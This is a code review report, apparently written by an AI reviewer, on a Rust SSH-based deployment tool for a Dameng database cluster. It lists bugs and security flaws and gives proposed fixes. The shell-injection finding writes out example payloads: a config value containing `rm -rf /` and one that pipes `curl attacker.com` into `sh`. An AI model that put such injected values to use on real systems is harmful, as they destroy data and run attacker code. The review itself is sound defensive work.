---
phase: 03-cluster
reviewed: 2026-06-13T00:00:00Z
depth: standard
files_reviewed: 18
files_reviewed_list:
  - src/config/cluster.rs
  - src/cluster/mod.rs
  - src/cluster/templates/mod.rs
  - src/cluster/templates/dm_ini.rs
  - src/cluster/templates/dmmal_ini.rs
  - src/cluster/templates/dmarch_ini.rs
  - src/cluster/templates/dmwatcher_ini.rs
  - tests/fixtures/cluster_valid.toml
  - tests/fixtures/cluster_invalid_no_primary.toml
  - src/config/mod.rs
  - src/cluster/ssh.rs
  - src/cluster/preflight.rs
  - src/cluster/health.rs
  - Cargo.toml
  - src/cluster/deploy.rs
  - src/cli.rs
  - src/main.rs
  - src/install/silent_install.rs
findings:
  critical: 5
  warning: 5
  info: 1
  total: 11
status: issues_found
---

# Phase 03: Code Review Report

**Reviewed:** 2026-06-13T00:00:00Z
**Depth:** standard
**Files Reviewed:** 18
**Status:** issues_found

## Summary

Phase 03 implements SSH infrastructure, preflight checks, health monitoring, config template generation, and end-to-end cluster deploy orchestration for 达梦数据库's primary/standby cluster mode. The overall architecture is sound and the test coverage is solid. However, there are five blockers that prevent this code from deploying a working cluster: the installer ISO is uploaded but never extracted before being invoked, new config files are written via SFTP without the CREATE flag causing guaranteed failure, `~` in SSH key paths is never expanded (failing the most common real-world configuration), user-controlled strings from config are interpolated unquoted into shell commands enabling injection, and the TOFU SSH handler accepts any host key silently without even logging a warning.

---

## Critical Issues

### CR-01: ISO uploaded to remote but DMInstall.bin invoked directly — no extraction step

**File:** `src/cluster/deploy.rs:45-54`

**Issue:** `upload_installer_and_install` uploads the installer package as `/tmp/dm_installer_<instance>.iso`, but the subsequent install command is `cd /tmp && DMInstall.bin -q <xml>`. The uploaded ISO and the command are completely disconnected. There is no step that mounts the ISO, extracts its contents, or symlinks/renames the uploaded file to `DMInstall.bin`. As written, the install command will fail with "command not found" unless `DMInstall.bin` happens to already exist on the remote node, which defeats the purpose of uploading the installer package.

**Fix:** After uploading the ISO, add an extraction/mount step before invoking the installer. For a `.tar.gz` package, extract it; for a `.iso`, mount it or use `isoinfo`/`7z`. Alternatively, if the package is a self-contained executable (`.bin`), upload it directly, `chmod +x`, and invoke it by its uploaded path:

```rust
let remote_bin = format!("/tmp/dm_installer_{}.bin", node.instance_name);
runner.sftp_write(&remote_bin, &bytes).await
    .context("SFTP 上传安装包失败")?;
let chmod_cmd = format!("chmod +x {}", remote_bin);
runner.exec(&chmod_cmd).await
    .map_err(|e| anyhow::anyhow!("chmod 失败: {}", e))?;
let install_cmd = format!("{} -q {}", remote_bin, remote_xml);
```

---

### CR-02: `sftp_write` uses `OpenFlags::WRITE` without `CREATE` — will fail for new config files

**File:** `src/cluster/ssh.rs:170`, `src/cluster/deploy.rs:117-130`

**Issue:** `SshSession::sftp_write` calls `sftp.write(remote_path, bytes)`, which internally calls `open_with_flags(path, OpenFlags::WRITE)`. Per the SFTP protocol (draft-ietf-secsh-filexfer-02 §6.3) and confirmed in the russh-sftp source (`src/protocol/open.rs`), `OpenFlags::WRITE` without `OpenFlags::CREATE` requires the file to already exist on the remote. The files being written — `dmmal.ini`, `dmarch.ini`, `dmwatcher.ini`, and `dm.ini.cluster_suffix` — do not exist prior to `distribute_configs` (they are new files created as part of cluster configuration). Every `sftp_write` call for these files will return an SFTP `SSH_FX_NO_SUCH_FILE` error and the deployment will abort.

**Fix:** Use `sftp.create(remote_path)` and write via the returned handle, or use `open_with_flags` with `OpenFlags::CREATE | OpenFlags::TRUNCATE | OpenFlags::WRITE`:

```rust
// In SshSession::sftp_write, replace:
sftp.write(remote_path, bytes).await ...

// With:
let mut file = sftp.create(remote_path).await.map_err(|source| SshError::SftpUpload {
    remote_path: remote_path.to_string(),
    source,
})?;
file.write_all(bytes).await.map_err(|e| SshError::SftpUpload {
    remote_path: remote_path.to_string(),
    source: russh_sftp::client::error::Error::UnexpectedBehavior(e.to_string()),
})
```

---

### CR-03: `identity_file = "~/.ssh/id_rsa"` silently fails — tilde is not expanded

**File:** `src/cluster/ssh.rs:122`, `tests/fixtures/cluster_valid.toml:14`

**Issue:** `try_key_auth` passes the `identity_file` `PathBuf` directly to `russh::keys::load_secret_key`, which calls `std::fs::File::open(path)`. Rust's `File::open` does not expand the `~` prefix — it treats `~` as a literal directory name in the filesystem root. A path like `~/.ssh/id_rsa` from the TOML config will produce a "No such file or directory" error. Key auth fails silently in `try_auth` (the error is swallowed at line 101), so the fallback to password auth occurs without any indication that the key path was wrong. The fixture `cluster_valid.toml` uses `identity_file = "~/.ssh/id_rsa"`, making this the expected default usage pattern, and it will fail for every real deployment.

**Fix:** Expand the tilde before passing to `load_secret_key`. Since the standard library has no built-in tilde expansion, use the `home` crate or manual expansion:

```rust
async fn try_key_auth(
    handle: &mut client::Handle<TofuHandler>,
    user: &str,
    identity_file: &std::path::PathBuf,
) -> Result<(), russh::Error> {
    let expanded = expand_tilde(identity_file);
    let key_pair = load_secret_key(&expanded, None)?;
    // ...
}

fn expand_tilde(path: &std::path::PathBuf) -> std::path::PathBuf {
    if let Ok(s) = path.to_str() {
        if let Some(stripped) = s.strip_prefix("~/") {
            if let Some(home) = std::env::var_os("HOME") {
                return std::path::PathBuf::from(home).join(stripped);
            }
        }
    }
    path.clone()
}
```

---

### CR-04: Shell command injection via unquoted user-controlled config fields

**File:** `src/cluster/deploy.rs:15-22, 50, 97, 132-135, 147-150, 169-175, 192-194`

**Issue:** All shell commands are constructed by formatting user-controlled strings from the TOML config directly into shell command strings without quoting or escaping. Fields used this way include `node.install_path`, `node.data_path`, `node.instance_name`, and `node.host`. For example:

- Line 50: `format!("cd /tmp && DMInstall.bin -q {}", remote_xml)` — `instance_name` in `remote_xml`
- Line 132: `format!("cat {0} >> {1}", target_path(...), target_path(...))` — both paths contain `data_path` and `instance_name`
- Lines 147-150: `nohup {install_path}/bin/dmserver {data_path}/{instance_name}/dm.ini mount ...`
- Lines 169-175: `echo "{sql_block}" | {install_path}/bin/disql ...` — `sql_block` contains formatted strings, though `role_sql` is safe since it's a match arm

A config value like `install_path = "/opt/dm; rm -rf /"` or `instance_name = "foo && curl attacker.com | sh"` would execute arbitrary commands on every remote node. Since TOML config files are written by users/DBAs who might receive them from untrusted sources, this is an injection risk.

**Fix:** Shell-quote all paths before interpolation. Wrap each user-supplied path component with single quotes and escape any embedded single quotes:

```rust
fn shell_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', "'\\''"))
}

// Usage:
let cmd = format!(
    "nohup {}/bin/dmserver {}/{}/dm.ini mount > /tmp/dmserver_{}.log 2>&1 &",
    shell_quote(&node.install_path),
    shell_quote(&node.data_path),
    shell_quote(&node.instance_name),
    shell_quote(&node.instance_name),
);
```

Alternatively, validate `install_path`, `data_path`, and `instance_name` at config load time to allow only safe characters (alphanumeric, `/`, `-`, `_`, `.`).

---

### CR-05: TOFU SSH host key handler accepts any key silently — no audit trail, no known_hosts

**File:** `src/cluster/ssh.rs:40-58`

**Issue:** `TofuHandler::check_server_key` unconditionally returns `Ok(true)` for every server key, accepting any host without verification. The code acknowledges this as "D-07" but there is no logging of the accepted key fingerprint, no comparison against any stored value (known_hosts or config-provided fingerprint), and no warning to the user. An attacker performing a man-in-the-middle attack during cluster deployment would be completely transparent to the operator. In a cluster deployment scenario where SSH credentials and database initialization commands are transmitted, this is a meaningful security exposure — if an adversary intercepts the SSH session, they receive the SSH password (if used) and can execute arbitrary commands on what they claim is the target node.

**Fix:** At minimum, log a warning including the key fingerprint so operators can detect unexpected key changes. Ideally, add an optional `host_key_fingerprint` field to `SshCredentials` and reject connections where it doesn't match:

```rust
async fn check_server_key(
    &mut self,
    server_public_key: &russh::keys::PublicKey,
) -> Result<bool, russh::Error> {
    // Log fingerprint so operator can audit
    let fingerprint = server_public_key.fingerprint(Default::default());
    tracing::warn!(
        "[ssh][TOFU] 接受服务器公钥 (未验证): {} — 请确认此为预期主机",
        fingerprint
    );
    self.accepted_keys.lock().unwrap().push(server_public_key.clone());
    Ok(true)
}
```

---

## Warnings

### WR-01: SSH port hardcoded to 22 — no `NodeConfig` field for custom SSH port

**File:** `src/cluster/mod.rs:25`, `src/config/cluster.rs`

**Issue:** `SshSession::connect` is called with a literal `22` as the SSH port. `NodeConfig` has no `ssh_port` field. Many production environments run SSH on non-standard ports (e.g., 2222, 22022) for security reasons. There is no way for a user to configure this; they would have to modify source code.

**Fix:** Add an optional `ssh_port` field to `SshCredentials` or `NodeConfig` with a default of 22:

```rust
// In SshCredentials:
#[serde(default = "default_ssh_port")]
pub ssh_port: u16,

fn default_ssh_port() -> u16 { 22 }

// In mod.rs:
let session = SshSession::connect(&node.host, node.ssh.ssh_port, &node.ssh.user, &node.ssh)
```

---

### WR-02: `SYSDBA/SYSDBA` credentials hardcoded in `configure_database_role`

**File:** `src/cluster/deploy.rs:173`

**Issue:** The `disql` connection string is `SYSDBA/SYSDBA@localhost:<port>`. The DM SYSDBA password defaults to `SYSDBA` but DBAs routinely change it during installation. There is no field in `NodeConfig` or `SshCredentials` to supply the database password. If the DBA changes the initial SYSDBA password as part of security hardening (which is standard practice), this step will fail with an authentication error.

**Fix:** Add an optional `db_password` field to `NodeConfig`, defaulting to `"SYSDBA"`:

```rust
#[serde(default = "default_db_password", skip_serializing)]
pub db_password: String,

fn default_db_password() -> String { "SYSDBA".to_string() }
```

---

### WR-03: `try_auth` silently swallows key authentication errors other than `NotAuthenticated`

**File:** `src/cluster/ssh.rs:100-103`

**Issue:** `try_key_auth` can fail for reasons other than "wrong key" — for example, the key file doesn't exist (tilde not expanded, per CR-03), the key file is corrupted, or the key format is unsupported. All of these errors are silently ignored by `if try_key_auth(...).await.is_ok()`, and the code falls through to attempt password authentication. This masks real configuration errors. If a user specifies `identity_file` but has no `password`, and the key file is missing, the error from password auth ("no password provided") will be the only signal, with no indication that the key file was the actual problem.

**Fix:** Log key auth failures at debug level before falling through:

```rust
if let Some(identity_file) = &creds.identity_file {
    match try_key_auth(handle, user, identity_file).await {
        Ok(()) => return Ok(()),
        Err(e) => {
            tracing::debug!("[ssh] 密钥认证失败 ({:?}): {}，尝试密码认证", identity_file, e);
        }
    }
}
```

---

### WR-04: Port uniqueness not validated across nodes — same DB port on different hosts is silently accepted

**File:** `src/config/cluster.rs:156-194`

**Issue:** `validate_single_node` checks that `mal_port != port` within a single node, but it does not validate cross-node port conflicts. Two nodes sharing the same `port` value (e.g., both using 5236) is fine since they're on different hosts — but `mal_port`, `dw_port`, and `inst_dw_port` are completely unchecked: there is no validation that `dw_port != mal_port`, `dw_port != port`, `inst_dw_port != port`, `inst_dw_port != mal_port`, or `inst_dw_port != dw_port` within a single node. A config with `port=5236, mal_port=5237, dw_port=5237` would pass validation and cause obscure MAL startup failures.

**Fix:** Extend `validate_single_node` to check all port pairs for equality:

```rust
fn validate_single_node(node: &NodeConfig) -> Result<()> {
    let ports = [
        ("port", node.port),
        ("mal_port", node.mal_port),
        ("dw_port", node.dw_port),
        ("inst_dw_port", node.inst_dw_port),
    ];
    for i in 0..ports.len() {
        for j in (i + 1)..ports.len() {
            if ports[i].1 == ports[j].1 {
                bail!(
                    "配置验证失败: node[{}] {} 不能等于 {}: {}",
                    node.host, ports[i].0, ports[j].0, ports[i].1
                );
            }
        }
    }
    // ... rest of existing checks
}
```

---

### WR-05: `run_startup_phase` only starts the first standby — silently skips additional standbys

**File:** `src/cluster/mod.rs:139-146`

**Issue:** `run_startup_phase` uses `.find(|(n, _)| n.role == NodeRole::Standby)` which returns only the first matching standby node. If the cluster config contains two standby nodes, the second standby is never started. Since `check_role_uniqueness` in config validation only enforces exactly one primary but places no upper limit on standby count, a user can write a valid two-standby config that silently deploys only one standby.

**Fix:** Replace the single `.find` with an iterator over all standbys:

```rust
let standbys: Vec<_> = runners
    .iter()
    .filter(|(n, _)| n.role == NodeRole::Standby)
    .collect();
for (standby_node, standby_runner) in &standbys {
    deploy::start_dmserver_mount(standby_node, standby_runner.as_ref()).await?;
    health_check_fn(standby_node.host.clone(), standby_node.port, 60).await?;
    deploy::configure_database_role(
        standby_node, NodeRole::Standby, config.cluster.oguid, standby_runner.as_ref()
    ).await?;
}
```

---

## Info

### IN-01: `TofuHandler::check_server_key` panics on mutex poison in production path

**File:** `src/cluster/ssh.rs:54`

**Issue:** `self.accepted_keys.lock().unwrap()` will panic if the mutex is poisoned (i.e., if another thread panicked while holding the lock). In async Tokio code this is extremely unlikely since tasks do not hold mutex locks across await points, but it violates the project's Rust quality standard. Since `check_server_key` is called in the production SSH connection path (not test code), this `unwrap` should be handled.

**Fix:** Use `.lock().unwrap_or_else(|e| e.into_inner())` or convert to an `RwLock`-free approach since `TofuHandler` has `&mut self` access in the handler:

```rust
async fn check_server_key(
    &mut self,
    server_public_key: &russh::keys::PublicKey,
) -> Result<bool, russh::Error> {
    match self.accepted_keys.lock() {
        Ok(mut keys) => keys.push(server_public_key.clone()),
        Err(e) => e.into_inner().push(server_public_key.clone()),
    }
    Ok(true)
}
```

---

_Reviewed: 2026-06-13T00:00:00Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
